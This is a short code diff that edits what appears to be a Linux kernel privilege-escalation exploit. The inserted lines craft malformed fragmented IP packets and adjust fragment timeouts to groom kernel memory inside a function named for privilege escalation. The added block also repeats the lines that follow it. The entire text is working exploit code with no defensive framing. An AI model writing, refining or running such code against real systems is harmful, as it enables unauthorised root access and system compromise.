@@ -273,7 +273,6 @@ static void search_for_vmk(void *pte_area, void *_pmd_area, void *pmd_data_area)
         }
     }
 }
-
 static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 {
     unsigned long long *pte_area;
@@ -336,6 +335,14 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
     // Original privilege escalation logic continues...
 
     set_ipfrag_time(1);
+
+    // cause socket/networking-related objects to be allocated
+    df_ip_header.ip_id = 0x1336;
+    df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 8 + 4000;
+    df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
+    alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);
+
+    set_ipfrag_time(9999);
 
     // cause socket/networking-related objects to be allocated
     df_ip_header.ip_id = 0x1336;
